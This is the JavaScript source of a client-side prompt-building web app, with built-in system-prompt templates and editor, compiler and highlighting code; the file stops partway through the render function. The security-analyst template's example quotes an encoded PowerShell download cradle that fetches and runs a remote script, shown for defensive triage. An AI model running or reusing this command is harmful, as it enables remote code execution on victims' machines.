/*!
 * PromptArchitect — Visual AI System Prompt & Agent Skill Studio
 * 100% client-side. MIT License (c) 2026 Fathimath Malaak Jaufar
 */
(() => {
  'use strict';

  /* ------------------------------------------------------------------ *
   * Constants
   * ------------------------------------------------------------------ */
  const STORAGE_KEYS = {
    draft: 'promptarchitect:draft:v1',
    templates: 'promptarchitect:templates:v1',
    tab: 'promptarchitect:tab:v1'
  };
  const AUTOSAVE_DELAY = 450;
  const TOKEN_BUDGET = 4000;
  const FORMAT_LABELS = {
    markdown: 'Clean Markdown',
    xml: 'Anthropic-style XML',
    json: 'OpenAI JSON Schema'
  };
  const FORMATS = ['markdown', 'xml', 'json'];
  const IS_MAC = /Mac|iPhone|iPad|iPod/i.test(navigator.platform || navigator.userAgent || '');

  const EMPTY_STATE = Object.freeze({
    name: '',
    description: '',
    role: '',
    context: '',
    constraints: [],
    outputFormat: '',
    examples: [],
    templateId: null
  });

  /* ------------------------------------------------------------------ *
   * Built-in templates
   * ------------------------------------------------------------------ */
  const BUILTIN_TEMPLATES = {
    'coding-assistant': {
      name: 'coding-assistant',
      description: 'Senior full-stack engineer that writes, reviews, refactors and debugs production-grade code with clear reasoning.',
      role: 'You are a senior full-stack software engineer with 15 years of experience shipping production systems in TypeScript, Python, Go and SQL. You write clean, idiomatic, well-tested code, explain trade-offs like a patient tech lead, and treat security and maintainability as first-class requirements.',
      context: 'You are embedded in a developer\'s workflow as a pair programmer. Users will paste code snippets, stack traces, failing tests, or describe features they want to build. They are usually working in an existing codebase with established conventions, so match the style, framework and language version that is visible in their code. Assume the code will run in production unless told otherwise.',
      constraints: [
        'Never invent APIs, library functions, CLI flags or configuration keys; if you are unsure something exists, say so explicitly.',
        'Prefer the standard library and dependencies already present in the project before suggesting new packages.',
        'Always handle errors and edge cases (null/undefined, empty input, network failure, concurrency) in the code you write.',
        'Never output secrets, hard-coded credentials or insecure patterns such as string-concatenated SQL or eval on user input.',
        'Keep changes minimal and focused on the request; do not rewrite unrelated code.',
        'When fixing a bug, state the root cause in one or two sentences before showing the fix.'
      ],
      outputFormat: 'Respond in GitHub-flavored Markdown using this structure:\n1. **Summary**: one or two sentences describing the solution.\n2. **Code**: complete, runnable code blocks with the correct language tag and file path as a comment on the first line.\n3. **Why this works**: short bullet list of key decisions and trade-offs.\n4. **Tests**: at least one unit test or a manual verification step.\nKeep prose concise; code must be complete with no ellipses or omitted sections.',
      examples: [
        {
          input: 'My Express route crashes with "Cannot read properties of undefined (reading \'id\')" when the user is not logged in.\n\napp.get(\'/me\', (req, res) => {\n  res.json({ id: req.user.id });\n});',
          output: '**Summary**: `req.user` is undefined for anonymous requests, so guard the route and return 401.\n\n```js\n// routes/me.js\napp.get(\'/me\', (req, res) => {\n  if (!req.user) {\n    return res.status(401).json({ error: \'Not authenticated\' });\n  }\n  return res.json({ id: req.user.id });\n});\n```\n\n**Why this works**\n- Fails fast with the correct HTTP status instead of throwing a 500.\n- Keeps the happy path unchanged.\n\n**Tests**: request `/me` without a session cookie and expect `401`.'
        },
        {
          input: 'Write a Python function that chunks a list into groups of n.',
          output: '**Summary**: A generator that yields successive slices, safe for any n ≥ 1.\n\n```python\n# utils/chunk.py\nfrom typing import Iterator, Sequence, TypeVar\n\nT = TypeVar("T")\n\ndef chunk(items: Sequence[T], n: int) -> Iterator[Sequence[T]]:\n    if n < 1:\n        raise ValueError("n must be >= 1")\n    for i in range(0, len(items), n):\n        yield items[i:i + n]\n```\n\n**Tests**: `assert list(chunk([1, 2, 3, 4, 5], 2)) == [[1, 2], [3, 4], [5]]`'
        }
      ]
    },
    'cybersecurity-analyst': {
      name: 'cybersecurity-analyst',
      description: 'SOC analyst that triages alerts, analyses logs and indicators of compromise, maps findings to MITRE ATT&CK and recommends remediation.',
      role: 'You are a Tier 3 Security Operations Center (SOC) analyst and incident responder holding GCIH, OSCP and CISSP certifications. You think like an attacker, communicate like a consultant, and always prioritise containment and evidence preservation.',
      context: 'You support a security team at a mid-sized company running a hybrid environment: Microsoft 365, Azure AD (Entra ID), AWS workloads, Linux servers and Windows endpoints protected by an EDR. Users will share SIEM alerts, raw log lines, suspicious URLs or file hashes, phishing emails, and vulnerability scan output. All analysis is defensive and authorised by the organisation.',
      constraints: [
        'Only provide defensive, detection and remediation guidance; refuse to write functional malware, exploits for unpatched third-party systems, or instructions to attack systems the user does not own.',
        'Clearly separate confirmed facts from hypotheses and assign a confidence level (Low / Medium / High) to every conclusion.',
        'Map observed behaviour to MITRE ATT&CK technique IDs where applicable.',
        'Never ask the user to paste passwords, private keys or full session tokens; tell them to redact secrets.',
        'Recommend containment steps that preserve forensic evidence (isolate, snapshot, collect) before destructive actions (wipe, reimage).',
        'Defang all indicators in your output (e.g. hxxps://example[.]com, 192.168.1[.]10).'
      ],
      outputFormat: 'Use this incident-report structure in Markdown:\n- **Severity**: Critical / High / Medium / Low / Informational, with one-line justification\n- **Summary**: what happened in plain language (max 3 sentences)\n- **Indicators of Compromise**: defanged table with Type | Value | Context\n- **MITRE ATT&CK Mapping**: Technique ID, name and evidence\n- **Recommended Actions**: numbered list ordered as Contain → Eradicate → Recover → Lessons learned\n- **Detection Opportunities**: a Sigma rule or KQL/SPL query when possible',
      examples: [
        {
          input: 'EDR alert: powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADQALwBhACcAKQA= spawned by WINWORD.EXE on FIN-LAPTOP-22',
          output: '- **Severity**: High (Office macro spawning encoded PowerShell download cradle)\n- **Summary**: A Word document launched hidden PowerShell that downloads and executes a remote script, consistent with a malicious macro initial-access chain. Confidence: High.\n- **Indicators of Compromise**\n\n| Type | Value | Context |\n|---|---|---|\n| URL | hxxp://185.220.101[.]4/a | Download cradle target |\n| Host | FIN-LAPTOP-22 | Affected endpoint |\n\n- **MITRE ATT&CK Mapping**: T1566.001 Spearphishing Attachment; T1059.001 PowerShell; T1027 Obfuscated Files or Information.\n- **Recommended Actions**\n  1. Network-isolate FIN-LAPTOP-22 via EDR; capture memory image.\n  2. Block 185.220.101[.]4 at the firewall and proxy.\n  3. Retrieve the source email and purge it from all mailboxes.\n  4. Reset the user\'s credentials and revoke active sessions.\n- **Detection Opportunities**: KQL `DeviceProcessEvents | where InitiatingProcessFileName =~ "winword.exe" and FileName =~ "powershell.exe" and ProcessCommandLine has "-enc"`'
        }
      ]
    },
    'social-media-strategist': {
      name: 'social-media-strategist',
      description: 'Social media content strategist that turns a brand brief into platform-native hooks, captions, content calendars and campaign ideas.',
      role: 'You are a senior social media content strategist who has grown brand accounts from zero to millions of followers across TikTok, Instagram, LinkedIn, X and YouTube Shorts. You blend data-driven thinking with sharp, human copywriting and you understand each platform\'s culture, formats and algorithm signals.',
      context: 'You work with small businesses, creators and startups that have limited budgets and small teams. They will give you a product, audience, goal (awareness, engagement, leads or sales) and sometimes a brand voice. Content should be realistic to produce with a smartphone and free editing tools. Trends change quickly, so favour evergreen formats and flag anything that depends on a currently trending sound or meme.',
      constraints: [
        'Write platform-native copy: adapt length, tone, hashtags and format for each platform instead of reusing one caption.',
        'Every post idea must open with a scroll-stopping hook in the first 3 seconds or first line.',
        'Never fabricate statistics, testimonials, follower counts or partnerships.',
        'Keep hashtags relevant and limited (3–5 on Instagram and TikTok, 0–3 on LinkedIn and X).',
        'Include a clear call to action aligned with the stated goal.',
        'Respect advertising disclosure rules: mark sponsored or affiliate content with #ad or a paid-partnership label.'
      ],
      outputFormat: 'Return a Markdown content plan:\n## Strategy snapshot\nAudience, core message, content pillars (3) and posting cadence.\n## Content calendar\nA table with columns: Day | Platform | Format | Hook | Caption | CTA | Hashtags.\n## Top idea deep-dive\nShot-by-shot script for the strongest short-form video (scene, on-screen text, voiceover, duration).\n## Metrics to watch\n3–5 KPIs with a target for the first 30 days.',
      examples: [
        {
          input: 'I run a small specialty coffee shop in Malé, Maldives. Goal: more weekday morning foot traffic from office workers. Platforms: Instagram and TikTok.',
          output: '## Strategy snapshot\n- **Audience**: office workers aged 22–40 within walking distance\n- **Core message**: "Your 7-minute island reset before work."\n- **Pillars**: Speed & ritual · Behind the bar · Local faces\n- **Cadence**: 4 Reels/TikToks + 3 Stories per week\n\n## Content calendar\n| Day | Platform | Format | Hook | Caption | CTA | Hashtags |\n|---|---|---|---|---|---|---|\n| Mon | TikTok | 15s POV | "POV: it\'s 7:52 and you still made it on time" | Order ahead, grab and go. | Order via link in bio | #MaleMaldives #CoffeeTok #MorningRoutine |\n| Wed | Instagram | Carousel | "3 drinks that beat the Monday slump" | Swipe for our barista\'s picks. | Save for tomorrow | #MaldivesCafe #SpecialtyCoffee #Male |\n\n## Top idea deep-dive\n1. (0–3s) Close-up of espresso pour, on-screen text: "7 minutes before your 8am".\n2. (3–9s) Barista hands cup through the window, ambient street sound.\n3. (9–15s) Customer walks off smiling, text: "Order ahead → link in bio".\n\n## Metrics to watch\n- Reel reach: 5,000/week\n- Link-in-bio clicks: 150/week\n- Weekday 7–9am transactions: +15% vs. baseline'
        }
      ]
    },
    'technical-writer': {
      name: 'technical-writer',
      description: 'Technical writer that produces clear, accurate, well-structured documentation, READMEs, API references and step-by-step tutorials.',
      role: 'You are an expert technical writer and developer-experience specialist who follows the Google Developer Documentation Style Guide and the Diátaxis framework. You turn complex systems into documentation that a busy engineer can scan, trust and act on.',
      context: 'You help engineering teams document software products: open-source libraries, internal platforms, REST and GraphQL APIs, CLIs and SDKs. Inputs may be raw source code, rough engineering notes, OpenAPI specs, changelogs or existing docs that need rewriting. Readers range from first-time users to experienced integrators, so identify the audience before writing.',
      constraints: [
        'Use second person ("you"), active voice and present tense; avoid jargon unless it is defined on first use.',
        'Every procedure must be a numbered list of single, verifiable actions with the expected result.',
        'Only document behaviour that is visible in the provided material; mark any assumption with a clearly labelled note.',
        'All code samples must be complete, copy-pasteable and use realistic placeholder values such as YOUR_API_KEY.',
        'Keep sentences under 25 words and paragraphs under 4 sentences.',
        'Use descriptive link text; never write "click here".'
      ],
      outputFormat: 'Produce Markdown documentation with:\n- A single H1 title and a one-paragraph overview stating who the page is for and what they will achieve.\n- A **Prerequisites** list.\n- Task-based H2 sections in logical order.\n- Fenced code blocks with language tags.\n- Tables for parameters (Name | Type | Required | Description).\n- A **Troubleshooting** section with common errors and fixes.\n- A **Next steps** section with 2–3 related links.',
      examples: [
        {
          input: 'Document this endpoint: POST /v1/webhooks, body { url: string, events: string[] }, returns 201 with { id, secret }. Needs Bearer token.',
          output: '# Create a webhook\n\nUse this endpoint to receive real-time event notifications at your own HTTPS URL. This page is for developers integrating server-side.\n\n## Prerequisites\n- An API key with the `webhooks:write` scope\n- A publicly reachable HTTPS endpoint\n\n## Request\n\n```bash\ncurl -X POST https://api.example.com/v1/webhooks \\\n  -H "Authorization: Bearer YOUR_API_KEY" \\\n  -H "Content-Type: application/json" \\\n  -d \'{"url": "https://yourapp.com/hooks", "events": ["order.created"]}\'\n```\n\n| Name | Type | Required | Description |\n|---|---|---|---|\n| `url` | string | Yes | HTTPS URL that receives events. |\n| `events` | string[] | Yes | Event types to subscribe to. |\n\n## Response\n\nA successful request returns `201 Created`:\n\n```json\n{ "id": "wh_123", "secret": "whsec_abc" }\n```\n\nStore `secret` securely; you use it to verify signatures.\n\n## Troubleshooting\n- **401 Unauthorized**: check that your API key is valid and has the `webhooks:write` scope.\n\n## Next steps\n- [Verify webhook signatures](#)\n- [List webhook event types](#)'
        }
      ]
    }
  };

  /* ------------------------------------------------------------------ *
   * DOM references
   * ------------------------------------------------------------------ */
  const $ = (sel, root = document) => root.querySelector(sel);
  const $$ = (sel, root = document) => Array.from(root.querySelectorAll(sel));

  const el = {
    autosaveStatus: $('#autosave-status'),
    autosaveText: $('#autosave-text'),
    templatesToggle: $('#btn-templates-toggle'),
    templatesMenu: $('#templates-menu'),
    btnSaveTemplate: $('#btn-save-template'),
    btnCopy: $('#btn-copy'),
    btnClear: $('#btn-clear'),
    btnExportJson: $('#btn-export-json'),
    btnExportMd: $('#btn-export-md'),
    btnHelp: $('#btn-help'),
    skillName: $('#skill-name'),
    skillDescription: $('#skill-description'),
    role: $('#role-input'),
    context: $('#context-input'),
    constraintsList: $('#constraints-list'),
    constraintsCount: $('#constraints-count'),
    btnAddConstraint: $('#btn-add-constraint'),
    outputFormat: $('#output-format-input'),
    examplesList: $('#examples-list'),
    examplesCount: $('#examples-count'),
    btnAddExample: $('#btn-add-example'),
    metricWords: $('#metric-words'),
    metricChars: $('#metric-chars'),
    metricTokens: $('#metric-tokens'),
    metricTokenBar: $('#metric-token-bar'),
    tabs: $$('[role="tab"][data-format]'),
    previewPanel: $('#preview-panel'),
    previewCode: $('#preview-code'),
    previewFormatLabel: $('#preview-format-label'),
    previewLineCount: $('#preview-line-count'),
    btnCopyPreview: $('#btn-copy-preview'),
    builtinTemplates: $('#builtin-templates'),
    customTemplates: $('#custom-templates'),
    customEmpty: $('#custom-templates-empty'),
    tplConstraint: $('#tpl-constraint-row'),
    tplExample: $('#tpl-example-pair'),
    tplCustomCard: $('#tpl-custom-template-card'),
    saveModal: $('#save-template-modal'),
    saveForm: $('#save-template-form'),
    templateNameInput: $('#template-name-input'),
    helpModal: $('#help-modal'),
    toastContainer: $('#toast-container'),
    footerYear: $('#footer-year'),
    jumpFab: $('#btn-jump-preview'),
    previewColumn: $('#preview-column'),
    editor: $('#editor')
  };

  /* ------------------------------------------------------------------ *
   * State
   * ------------------------------------------------------------------ */
  let activeFormat = 'markdown';
  let currentTemplateId = null;
  let customTemplates = [];
  let autosaveTimer = null;
  let renderFrame = null;
  let lastFocused = null;
  let uidCounter = 0;
  const compiled = { markdown: '', xml: '', json: '' };

  const uid = (prefix) => `${prefix}-${Date.now().toString(36)}-${(uidCounter++).toString(36)}`;

  /* ------------------------------------------------------------------ *
   * Utilities
   * ------------------------------------------------------------------ */
  const escapeHtml = (str) => String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');

  const escapeXmlText = (str) => String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');

  const escapeXmlAttr = (str) => escapeXmlText(str).replace(/"/g, '&quot;');

  const slugify = (str) => String(str)
    .normalize('NFKD')
    .replace(/[\u0300-\u036f]/g, '')
    .toLowerCase()
    .trim()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/^-+|-+$/g, '')
    .slice(0, 64);

  const clean = (str) => String(str ?? '').replace(/\r\n/g, '\n').trim();

  const refreshIcons = () => {
    if (window.lucide && typeof window.lucide.createIcons === 'function') {
      window.lucide.createIcons();
    }
  };

  const storage = {
    get(key, fallback) {
      try {
        const raw = localStorage.getItem(key);
        return raw === null ? fallback : JSON.parse(raw);
      } catch (err) {
        return fallback;
      }
    },
    set(key, value) {
      try {
        localStorage.setItem(key, JSON.stringify(value));
        return true;
      } catch (err) {
        return false;
      }
    },
    available() {
      try {
        const probe = '__promptarchitect_probe__';
        localStorage.setItem(probe, '1');
        localStorage.removeItem(probe);
        return true;
      } catch (err) {
        return false;
      }
    }
  };
  let storageOk = true;

  /* ------------------------------------------------------------------ *
   * Auto-growing textareas
   * ------------------------------------------------------------------ */
  const AUTOSIZE_MAX = { default: 420, small: 260 };

  function autosize(area) {
    if (!area || area.tagName !== 'TEXTAREA' || !area.isConnected) return;
    const max = area.matches('[data-constraint-input]') ? AUTOSIZE_MAX.small : AUTOSIZE_MAX.default;
    area.style.height = 'auto';
    const borders = area.offsetHeight - area.clientHeight;
    const needed = area.scrollHeight + borders;
    const height = Math.min(needed, max);
    area.style.height = `${height}px`;
    area.classList.toggle('is-capped', needed > max);
  }

  const autosizeAll = () => $$('textarea[data-autosize]').forEach(autosize);

  const formatRelative = (ts) => {
    const diff = Math.round((Date.now() - ts) / 1000);
    if (diff < 45) return 'Saved just now';
    if (diff < 3600) return `Saved ${Math.round(diff / 60)} min ago`;
    if (diff < 86400) return `Saved ${Math.round(diff / 3600)} h ago`;
    return `Saved ${new Date(ts).toLocaleDateString(undefined, { day: 'numeric', month: 'short', year: 'numeric' })}`;
  };

  /* ------------------------------------------------------------------ *
   * Toasts
   * ------------------------------------------------------------------ */
  const TOAST_ICONS = { success: 'check-circle-2', error: 'alert-triangle', info: 'info' };

  function toast(message, type = 'success', duration = 2600) {
    const node = document.createElement('div');
    node.className = `toast toast--${type}`;
    node.setAttribute('role', type === 'error' ? 'alert' : 'status');
    const icon = document.createElement('i');
    icon.className = 'toast-icon h-4 w-4';
    icon.setAttribute('data-lucide', TOAST_ICONS[type] || TOAST_ICONS.info);
    const text = document.createElement('span');
    text.textContent = message;
    node.append(icon, text);
    el.toastContainer.appendChild(node);
    refreshIcons();
    const remove = () => {
      if (!node.isConnected || node.classList.contains('is-leaving')) return;
      node.classList.add('is-leaving');
      node.addEventListener('animationend', () => node.remove(), { once: true });
      setTimeout(() => node.remove(), 400);
    };
    node.addEventListener('click', remove);
    setTimeout(remove, duration);
    while (el.toastContainer.children.length > 4) el.toastContainer.firstElementChild.remove();
  }

  /* ------------------------------------------------------------------ *
   * Editor rows
   * ------------------------------------------------------------------ */
  function renumberConstraints() {
    const rows = $$('[data-constraint-row]', el.constraintsList);
    rows.forEach((row, i) => {
      $('[data-row-index]', row).textContent = String(i + 1);
      $('[data-constraint-input]', row).setAttribute('aria-label', `Constraint ${i + 1}`);
    });
    el.constraintsCount.textContent = String(rows.length);
  }

  function renumberExamples() {
    const pairs = $$('[data-example-pair]', el.examplesList);
    pairs.forEach((pair, i) => {
      $('[data-example-index]', pair).textContent = String(i + 1);
      $('[data-remove-example]', pair).setAttribute('aria-label', `Remove example ${i + 1}`);
    });
    el.examplesCount.textContent = String(pairs.length);
  }

  function addConstraint(value = '', { focus = false } = {}) {
    const frag = el.tplConstraint.content.cloneNode(true);
    const row = $('[data-constraint-row]', frag);
    const input = $('[data-constraint-input]', row);
    input.id = uid('constraint');
    input.value = String(value).replace(/\s*\n+\s*/g, ' ');
    el.constraintsList.appendChild(frag);
    renumberConstraints();
    autosize(input);
    if (focus) input.focus();
    return row;
  }

  function addExample(example = { input: '', output: '' }, { focus = false } = {}) {
    const frag = el.tplExample.content.cloneNode(true);
    const pair = $('[data-example-pair]', frag);
    const inputArea = $('[data-example-input]', pair);
    const outputArea = $('[data-example-output]', pair);
    const id = uid('example');
    inputArea.id = `${id}-input`;
    outputArea.id = `${id}-output`;
    $('[data-example-input-label]', pair).setAttribute('for', inputArea.id);
    $('[data-example-output-label]', pair).setAttribute('for', outputArea.id);
    inputArea.value = example.input || '';
    outputArea.value = example.output || '';
    el.examplesList.appendChild(frag);
    renumberExamples();
    autosize(inputArea);
    autosize(outputArea);
    if (focus) inputArea.focus();
    return pair;
  }

  function removeWithAnimation(node, after) {
    const reduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    if (reduce) {
      node.remove();
      after();
      return;
    }
    node.classList.add('is-removing');
    let done = false;
    const finish = () => {
      if (done) return;
      done = true;
      node.remove();
      after();
    };
    node.addEventListener('animationend', finish, { once: true });
    setTimeout(finish, 260);
  }

  /* ------------------------------------------------------------------ *
   * State <-> DOM
   * ------------------------------------------------------------------ */
  function collectState() {
    return {
      name: el.skillName.value,
      description: el.skillDescription.value,
      role: el.role.value,
      context: el.context.value,
      constraints: $$('[data-constraint-input]', el.constraintsList).map((i) => i.value),
      outputFormat: el.outputFormat.value,
      examples: $$('[data-example-pair]', el.examplesList).map((pair) => ({
        input: $('[data-example-input]', pair).value,
        output: $('[data-example-output]', pair).value
      })),
      templateId: currentTemplateId
    };
  }

  function normaliseState(raw) {
    const s = raw && typeof raw === 'object' ? raw : {};
    return {
      name: typeof s.name === 'string' ? s.name : '',
      description: typeof s.description === 'string' ? s.description : '',
      role: typeof s.role === 'string' ? s.role : '',
      context: typeof s.context === 'string' ? s.context : '',
      constraints: Array.isArray(s.constraints) ? s.constraints.filter((c) => typeof c === 'string') : [],
      outputFormat: typeof s.outputFormat === 'string' ? s.outputFormat : '',
      examples: Array.isArray(s.examples)
        ? s.examples
          .filter((e) => e && typeof e === 'object')
          .map((e) => ({ input: String(e.input ?? ''), output: String(e.output ?? '') }))
        : [],
      templateId: typeof s.templateId === 'string' ? s.templateId : null
    };
  }

  function applyState(raw) {
    const s = normaliseState(raw);
    el.skillName.value = s.name;
    el.skillDescription.value = s.description;
    el.role.value = s.role;
    el.context.value = s.context;
    el.outputFormat.value = s.outputFormat;
    el.constraintsList.replaceChildren();
    el.examplesList.replaceChildren();
    (s.constraints.length ? s.constraints : ['']).forEach((c) => addConstraint(c));
    (s.examples.length ? s.examples : [{ input: '', output: '' }]).forEach((e) => addExample(e));
    currentTemplateId = s.templateId;
    markActiveTemplate();
    refreshIcons();
    autosizeAll();
    scheduleRender();
  }

  function isStateEmpty(s) {
    return !clean(s.name) && !clean(s.description) && !clean(s.role) && !clean(s.context) &&
      !clean(s.outputFormat) && !s.constraints.some((c) => clean(c)) &&
      !s.examples.some((e) => clean(e.input) || clean(e.output));
  }

  /* ------------------------------------------------------------------ *
   * Compilers
   * ------------------------------------------------------------------ */
  function prepared(s) {
    return {
      name: clean(s.name),
      slug: slugify(s.name) || 'untitled-skill',
      description: clean(s.description),
      role: clean(s.role),
      context: clean(s.context),
      constraints: s.constraints.map(clean).filter(Boolean),
      outputFormat: clean(s.outputFormat),
      examples: s.examples
        .map((e) => ({ input: clean(e.input), output: clean(e.output) }))
        .filter((e) => e.input || e.output)
    };
  }

  const titleFromSlug = (slug) => slug.split('-').filter(Boolean).map((w) => w[0].toUpperCase() + w.slice(1)).join(' ');

  function compileMarkdownBody(p) {
    const out = [];
    out.push(`# ${p.name ? titleFromSlug(slugify(p.name)) || p.name : 'System Prompt'}`);
    if (p.description) out.push('', `> ${p.description.replace(/\n/g, '\n> ')}`);
    if (p.role) out.push('', '## Role', '', p.role);
    if (p.context) out.push('', '## Context', '', p.context);
    if (p.constraints.length) {
      out.push('', '## Constraints', '');
      p.constraints.forEach((c, i) => out.push(`${i + 1}. ${c.replace(/\n/g, ' ')}`));
    }
    if (p.outputFormat) out.push('', '## Output Format', '', p.outputFormat);
    if (p.examples.length) {
      out.push('', '## Examples');
      p.examples.forEach((e, i) => {
        out.push('', `### Example ${i + 1}`, '', '**User:**', '', e.input || '_(empty)_', '', '**Assistant:**', '', e.output || '_(empty)_');
      });
    }
    return out.join('\n');
  }

  function compileMarkdown(s) {
    return compileMarkdownBody(prepared(s));
  }

  function compileXml(s) {
    const p = prepared(s);
    const block = (tag, text) => `<${tag}>\n${escapeXmlText(text)}\n</${tag}>`;
    const parts = [];
    const attrs = [`name="${escapeXmlAttr(p.slug)}"`];
    parts.push(`<system_prompt ${attrs.join(' ')}>`);
    if (p.description) parts.push(block('description', p.description));
    if (p.role) parts.push(block('role', p.role));
    if (p.context) parts.push(block('context', p.context));
    if (p.constraints.length) {
      parts.push('<constraints>');
      p.constraints.forEach((c, i) => parts.push(`  <constraint index="${i + 1}">${escapeXmlText(c.replace(/\n/g, ' '))}</constraint>`));
      parts.push('</constraints>');
    }
    if (p.outputFormat) parts.push(block('output_format', p.outputFormat));
    if (p.examples.length) {
      parts.push('<examples>');
      p.examples.forEach((e, i) => {
        parts.push(`<example index="${i + 1}">`);
        parts.push(block('user_input', e.input));
        parts.push(block('ideal_response', e.output));
        parts.push('</example>');
      });
      parts.push('</examples>');
    }
    parts.push('</system_prompt>');
    return parts.join('\n');
  }

  function buildJsonSchemaObject(s) {
    const p = prepared(s);
    const schemaName = p.slug.replace(/-/g, '_').slice(0, 64);
    const strField = (description, value) => ({ type: 'string', description, default: value });
    return {
      name: p.slug,
      description: p.description,
      instructions: compileMarkdownBody(p),
      response_format: {
        type: 'json_schema',
        json_schema: {
          name: schemaName,
          description: p.description || 'Structured system prompt generated with PromptArchitect.',
          strict: true,
          schema: {
            type: 'object',
            properties: {
              role: strField('Persona the model adopts.', p.role),
              context: strField('Background information and operating environment.', p.context),
              constraints: {
                type: 'array',
                description: 'Rules the model must follow.',
                items: { type: 'string' },
                default: p.constraints
              },
              output_format: strField('Required structure of every response.', p.outputFormat),
              examples: {
                type: 'array',
                description: 'Few-shot demonstrations of ideal behaviour.',
                items: {
                  type: 'object',
                  properties: {
                    input: { type: 'string', description: 'User message.' },
                    output: { type: 'string', description: 'Ideal assistant response.' }
                  },
                  required: ['input', 'output'],
                  additionalProperties: false
                },
                default: p.examples
              }
            },
            required: ['role', 'context', 'constraints', 'output_format', 'examples'],
            additionalProperties: false
          }
        }
      }
    };
  }

  function compileJson(s) {
    return JSON.stringify(buildJsonSchemaObject(s), null, 2);
  }

  function compileAll(s) {
    compiled.markdown = compileMarkdown(s);
    compiled.xml = compileXml(s);
    compiled.json = compileJson(s);
  }

  /* ------------------------------------------------------------------ *
   * Syntax highlighting
   * ------------------------------------------------------------------ */
  const span = (cls, html) => `<span class="${cls}">${html}</span>`;

  function highlightMarkdownInline(escaped) {
    return escaped
      .replace(/`([^`\n]+)`/g, (m) => span('tok-code', m))
      .replace(/\*\*([^*\n]+)\*\*/g, (m) => span('tok-bold', m));
  }

  function highlightMarkdown(text) {
    let inFence = false;
    return text.split('\n').map((line) => {
      const esc = escapeHtml(line);
      if (/^\s*```/.test(line)) {
        inFence = !inFence;
        return span('tok-comment', esc);
      }
      if (inFence) return span('tok-string', esc);
      if (/^---\s*$/.test(line)) return span('tok-rule', esc);
      let m = line.match(/^(#{1,6}\s)(.*)$/);
      if (m) return span('tok-heading', escapeHtml(m[1]) + highlightMarkdownInline(escapeHtml(m[2])));
      if (/^>\s?/.test(line)) return span('tok-comment', esc);
      m = line.match(/^(\s*)(\d+\.|[-*+])(\s.*)$/);
      if (m) return escapeHtml(m[1]) + span('tok-bullet', escapeHtml(m[2])) + highlightMarkdownInline(escapeHtml(m[3]));
      m = line.match(/^([a-z_]+)(:)(\s.*)$/);
      if (m) return span('tok-key', escapeHtml(m[1])) + span('tok-punct', m[2]) + span('tok-string', escapeHtml(m[3]));
      return highlightMarkdownInline(esc);
    }).join('\n');
  }

  function highlightXml(text) {
    const esc = escapeHtml(text);
    return esc.replace(/(&lt;\/?)([A-Za-z_][\w:.-]*)((?:\s+[\w:.-]+="[^"]*")*)(\s*\/?&gt;)/g, (_, open, name, attrs, close) => {
      const attrHtml = attrs.replace(/([\w:.-]+)(=)("[^"]*")/g, (__, k, eq, v) => span('tok-attr', k) + span('tok-punct', eq) + span('tok-string', v));
      return span('tok-punct', open) + span('tok-tag', name) + attrHtml + span('tok-punct', close);
    });
  }

  function highlightJson(text) {
    const re = /("(?:\\.|[^"\\])*")(\s*:)?|\b(true|false|null)\b|(-?\d+(?:\.\d+)?(?:[eE][+-]?\d+)?)|([{}[\],])/g;
    let out = '';
    let last = 0;
    let m;
    while ((m = re.exec(text)) !== null) {
      out += escapeHtml(text.slice(last, m.index));
      if (m[1]) {
        out += m[2]
          ? span('tok-key', escapeHtml(m[1])) + span('tok-punct', m[2])
          : span('tok-string', escapeHtml(m[1]));
      } else if (m[3]) {
        out += span('tok-bool', m[3]);
      } else if (m[4]) {
        out += span('tok-number', m[4]);
      } else if (m[5]) {
        out += span('tok-punct', m[5]);
      }
      last = re.lastIndex;
    }
    out += escapeHtml(text.slice(last));
    return out;
  }

  const HIGHLIGHTERS = { markdown: highlightMarkdown, xml: highlightXml, json: highlightJson };

  /* ------------------------------------------------------------------ *
   * Metrics
   * ------------------------------------------------------------------ */
  function estimateTokens(text) {
    // Tokenizers split letters, digits and punctuation into different chunks.
    const chunks = /([\p{L}\p{M}]+)|(\p{N}+)|([\r\n]+)|([^\S\r\n]+)|([^\s\p{L}\p{M}\p{N}]+)/gu;
    const cjk = /[\p{Script=Han}\p{Script=Hiragana}\p{Script=Katakana}\p{Script=Hangul}]/gu;
    let tokens = 0;
    for (const [chunk, letters, digits, lineBreaks, spaces] of text.matchAll(chunks)) {
      if (letters) {
        const cjkCount = letters.match(cjk)?.length || 0;
        const other = [...(cjkCount ? letters.replace(cjk, '') : letters)].length;
        tokens += cjkCount * 0.75 + (other ? Math.max(1, other / 7) : 0);
      } else if (digits) {
        tokens += Math.ceil([...digits].length / 3);
      } else if (lineBreaks) {
        tokens += lineBreaks.length / 4;
      } else if (spaces) {
        // A single separator typically joins the next word or symbol.
        tokens += spaces.length > 1 ? Math.ceil(spaces.length / 32) : 0;
      } else {
        tokens += Math.max(1, [...chunk].length / 3);
      }
    }
    return text ? Math.max(1, Math.round(tokens)) : 0;
  }

  function computeMetrics(text) {
    const chars = text.length;
    const words = (text.match(/\S+/g) || []).length;
    return { chars, words, tokens: estimateTokens(text) };
  }

  function setMetric(node, value) {
    const formatted = value.toLocaleString();
    if (node.textContent !== formatted) {
      node.textContent = formatted;
      node.classList.remove('bump');
      void node.offsetWidth;
      node.classList.add('bump');
    }
  }

  function updateMetrics(text) {
    const { chars, words, tokens } = computeMetrics(text);
    setMetric(el.metricWords, words);
    setMetric(el.metricChars, chars);
    setMetric(el.metricTokens, tokens);
    const pct = Math.min(100, (tokens / TOKEN_BUDGET) * 100);
    el.metricTokenBar.style.width = `${pct}%`;
    el.metricTokenBar.classList.toggle('is-warn', tokens > TOKEN_BUDGET * 0.75);
    el.metricTokenBar.parentElement.title = `${tokens.toLocaleString()} of ${TOKEN_BUDGET.toLocaleString()} token guideline`;
  }

  /* ------------------------------------------------------------------ *
   * Rendering
   * ------------------------------------------------------------------ */
  function render() {
    renderFrame = null;
    const state = collectState();
    compileAll(state);
    const text = compiled[activeFormat];
